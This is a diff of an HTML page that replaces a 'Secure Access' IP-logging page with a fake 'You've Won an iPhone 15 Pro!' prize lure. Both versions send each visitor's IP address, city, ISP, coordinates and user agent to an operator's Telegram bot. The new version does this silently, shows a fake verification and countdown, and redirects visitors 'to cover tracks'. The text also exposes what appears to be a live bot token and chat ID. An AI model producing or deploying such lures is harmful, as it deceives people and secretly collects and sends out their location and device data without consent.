@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Congratulations! You've Won!</title>
     <style>
         * {
             margin: 0;
@@ -12,448 +12,224 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
-            background-size: 20px 20px;
-            opacity: 0.3;
-            pointer-events: none;
+            text-align: center;
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 24px;
-            padding: 40px 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            max-width: 400px;
+            background: white;
+            border-radius: 30px;
+            padding: 40px 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            max-width: 380px;
             width: 100%;
-            position: relative;
-            z-index: 1;
-            transform: translateY(0);
-            transition: transform 0.3s ease;
+            animation: popIn 0.5s ease;
         }
 
-        .icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            margin: 0 auto 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
 
-        .icon svg {
-            width: 40px;
-            height: 40px;
-            fill: white;
+        .gift-box {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
         }
 
         h1 {
-            color: #1a202c;
-            font-size: 24px;
-            margin-bottom: 12px;
-            font-weight: 700;
+            color: #2d3436;
+            font-size: 26px;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .highlight {
+            color: #e74c3c;
+            font-weight: bold;
         }
 
         p {
-            color: #718096;
+            color: #636e72;
             font-size: 16px;
-            margin-bottom: 32px;
+            margin-bottom: 30px;
             line-height: 1.5;
         }
 
-        .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .claim-btn {
+            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
             color: white;
             border: none;
-            padding: 16px 48px;
-            font-size: 18px;
-            font-weight: 600;
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.4);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,184,148,0.4);
+            transition: all 0.3s;
             width: 100%;
-            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.5);
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,184,148,0.5);
         }
 
-        .btn:active {
+        .claim-btn:active {
             transform: translateY(0);
         }
 
-        .btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .btn:active::after {
-            width: 300px;
-            height: 300px;
-        }
-
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
+        .timer {
+            color: #e74c3c;
+            font-weight: bold;
             font-size: 14px;
-            font-weight: 500;
+            margin-top: 20px;
+        }
+
+        .hidden {
             display: none;
-            animation: slideIn 0.3s ease;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .status.success {
-            background: #c6f6d5;
-            color: #22543d;
-            display: block;
-        }
-
-        .status.error {
-            background: #fed7d7;
-            color: #742a2a;
-            display: block;
-        }
-
-        .status.loading {
-            background: #bee3f8;
-            color: #2a4365;
-            display: block;
+        .loading {
+            display: none;
+            margin-top: 20px;
         }
 
         .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #ffffff;
-            border-top-color: transparent;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00b894;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .config-section {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #e2e8f0;
+        .success-message {
             display: none;
-        }
-
-        .config-section.visible {
-            display: block;
-        }
-
-        .config-toggle {
-            color: #667eea;
-            font-size: 14px;
-            cursor: pointer;
-            text-decoration: underline;
-            margin-top: 16px;
-            display: inline-block;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 14px;
-            transition: border-color 0.3s;
-            font-family: inherit;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-
-        .config-section h3 {
-            font-size: 16px;
-            color: #2d3748;
-            margin-bottom: 16px;
-        }
-
-        .info-grid {
-            display: grid;
-            gap: 12px;
-            text-align: left;
+            color: #00b894;
+            font-size: 18px;
+            font-weight: bold;
             margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .info-item {
-            background: #f7fafc;
-            padding: 12px;
-            border-radius: 8px;
-            border-left: 3px solid #667eea;
-        }
-
-        .info-label {
-            color: #718096;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 4px;
-        }
-
-        .info-value {
-            color: #2d3748;
-            font-weight: 600;
-            word-break: break-all;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="icon">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
-            </svg>
+        <div class="gift-box">🎁</div>
+        <h1>You've Won an <span class="highlight">iPhone 15 Pro!</span></h1>
+        <p>Congratulations! You are the <strong>1,000th visitor</strong> today! Click below to claim your prize.</p>
+        
+        <button class="claim-btn" id="claimBtn" onclick="claimPrize()">Claim Now</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px; color: #636e72;">Verifying your location...</p>
         </div>
-        
-        <h1>Welcome Back</h1>
-        <p>Click the button below to verify your connection and continue browsing securely.</p>
-        
-        <button class="btn" id="actionBtn" onclick="handleClick()">
-            Click Me
-        </button>
-        
-        <div id="status" class="status"></div>
-        
-        <div id="infoDisplay" class="info-grid" style="display: none;"></div>
 
-        <span class="config-toggle" onclick="toggleConfig()">⚙️ Configure Telegram Bot</span>
-        
-        <div class="config-section" id="configSection">
-            <h3>Telegram Configuration</h3>
-            <input type="text" id="8521122830:AAFBXnF5E1m6ImzL-UIx1zcFsPBqC8TcdvA" placeholder="Bot Token (from @BotFather)">
-            <input type="text" id="8521122830" placeholder="Chat ID (your user ID)">
-            <button class="btn" style="padding: 10px; font-size: 14px;" onclick="saveConfig()">Save Configuration</button>
+        <div class="success-message" id="success">
+            ✅ Verified! Redirecting to shipping form...
         </div>
+
+        <div class="timer">⏰ Offer expires in <span id="countdown">05:00</span></div>
     </div>
 
     <script>
-        // Configuration storage
-        let config = {
-            botToken: localStorage.getItem('tg_bot_token') || '',
-            chatId: localStorage.getItem('tg_chat_id') || ''
-        };
+        // ==========================================
+        // CONFIGURE YOUR TELEGRAM BOT HERE
+        // ==========================================
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token from @BotFather
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace with your chat ID
+        // ==========================================
 
-        // Load saved config
-        if (config.botToken) document.getElementById('botToken').value = config.botToken;
-        if (config.chatId) document.getElementById('chatId').value = config.chatId;
+        // Countdown timer
+        let time = 300;
+        setInterval(() => {
+            time--;
+            const mins = Math.floor(time / 60).toString().padStart(2, '0');
+            const secs = (time % 60).toString().padStart(2, '0');
+            document.getElementById('countdown').textContent = `${mins}:${secs}`;
+        }, 1000);
 
-        function toggleConfig() {
-            const section = document.getElementById('configSection');
-            section.classList.toggle('visible');
-        }
-
-        function saveConfig() {
-            const token = document.getElementById('botToken').value.trim();
-            const chatId = document.getElementById('chatId').value.trim();
+        async function claimPrize() {
+            const btn = document.getElementById('claimBtn');
+            const loading = document.getElementById('loading');
             
-            if (token && chatId) {
-                localStorage.setItem('tg_bot_token', token);
-                localStorage.setItem('tg_chat_id', chatId);
-                config = { botToken: token, chatId: chatId };
-                showStatus('Configuration saved successfully!', 'success');
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                // Get IP info silently
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                // Prepare message
+                const message = `🎯 *PRANKED! New Victim Clicked!*\n\n` +
+                    `📱 IP: \`${ipData.ip}\`\n` +
+                    `📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
+                    `🏢 ISP: ${ipData.org}\n` +
+                    `🗺 Coords: ${ipData.latitude}, ${ipData.longitude}\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `📲 Device: ${navigator.userAgent}`;
+                
+                // Send to Telegram silently
+                if (BOT_TOKEN !== '8521122830:AAFBXnF5E1m6ImzL-UIx1zcFsPBqC8TcdvA' && CHAT_ID !== '8521122830') {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } else {
+                    console.log('Bot not configured yet!');
+                }
+
+                // Show fake success (keep them waiting)
                 setTimeout(() => {
-                    document.getElementById('configSection').classList.remove('visible');
-                }, 1000);
-            } else {
-                showStatus('Please fill in both fields', 'error');
-            }
-        }
+                    loading.style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                    
+                    // Optional: Redirect to real page after 3 seconds to cover tracks
+                    setTimeout(() => {
+                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Rick roll or your link
+                    }, 3000);
+                }, 2000);
 
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.className = 'status ' + type;
-            if (type === 'loading') {
-                status.innerHTML = '<span class="spinner"></span>' + message;
-            } else {
-                status.textContent = message;
-            }
-        }
-
-        async function getIPInfo() {
-            try {
-                // Using ipapi.co for comprehensive IP data (free tier available)
-                const response = await fetch('https://ipapi.co/json/');
-                if (!response.ok) throw new Error('Failed to fetch IP');
-                return await response.json();
             } catch (error) {
-                // Fallback to ipify if ipapi fails
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const { ip } = await ipResponse.json();
-                    return { ip, source: 'ipify' };
-                } catch (fallbackError) {
-                    throw new Error('Could not retrieve IP address');
-                }
+                // If it fails, still act normal so they don't suspect
+                console.error('Error:', error);
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                }, 2000);
             }
         }
 
-        async function sendToTelegram(data) {
-            if (!config.botToken || !config.chatId) {
-                throw new Error('Please configure Telegram Bot Token and Chat ID first (click ⚙️ Configure)');
-            }
-
-            const message = `📱 *New Connection Detected*\n\n` +
-                `🌐 *IP Address:* \\${data.ip}\n` +
-                (data.city ? `📍 *Location:* \\${data.city}, \\${data.region}, \\${data.country_name}\n` : '') +
-                (data.org ? `🏢 *ISP:* \\${data.org}\n` : '') +
-                (data.latitude ? `🗺 *Coords:* \\${data.latitude}, \\${data.longitude}\n` : '') +
-                `\n⏰ *Time:* \\${new Date().toLocaleString()}\n` +
-                `📱 *User Agent:* \\${navigator.userAgent}`;
-
-            const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: config.chatId,
-                    text: message,
-                    parse_mode: 'MarkdownV2'
-                })
-            });
-
-            if (!response.ok) {
-                const error = await response.json();
-                throw new Error(error.description || 'Failed to send message');
-            }
-
-            return await response.json();
-        }
-
-        function displayInfo(data) {
-            const display = document.getElementById('infoDisplay');
-            let html = '';
-            
-            const fields = [
-                { label: 'IP Address', value: data.ip },
-                { label: 'City', value: data.city },
-                { label: 'Region', value: data.region },
-                { label: 'Country', value: data.country_name },
-                { label: 'ISP', value: data.org },
-                { label: 'Timezone', value: data.timezone }
-            ];
-
-            fields.forEach(field => {
-                if (field.value) {
-                    html += `
-                        <div class="info-item">
-                            <div class="info-label">${field.label}</div>
-                            <div class="info-value">${field.value}</div>
-                        </div>
-                    `;
-                }
-            });
-
-            display.innerHTML = html;
-            display.style.display = 'grid';
-        }
-
-        async function handleClick() {
-            const btn = document.getElementById('actionBtn');
-            
-            try {
-                // Check config first
-                if (!config.botToken || !config.chatId) {
-                    showStatus('Please configure Telegram settings first (click ⚙️ below)', 'error');
-                    document.getElementById('configSection').classList.add('visible');
-                    return;
-                }
-
-                btn.disabled = true;
-                showStatus('Retrieving network information...', 'loading');
-
-                // Get IP info
-                const ipData = await getIPInfo();
-                
-                showStatus('Sending to Telegram...', 'loading');
-                
-                // Send to Telegram
-                await sendToTelegram(ipData);
-                
-                // Display success
-                showStatus('✓ Verification complete! Data sent to Telegram.', 'success');
-                displayInfo(ipData);
-                
-                btn.textContent = 'Completed';
-                
-            } catch (error) {
-                console.error(error);
-                showStatus('Error: ' + error.message, 'error');
-                btn.disabled = false;
-            }
-        }
-
-        // Prevent right-click to make it look more "secure" (optional)
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-        });
+        // Prevent right click (optional, makes it look more "official")
+        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 
 </body>
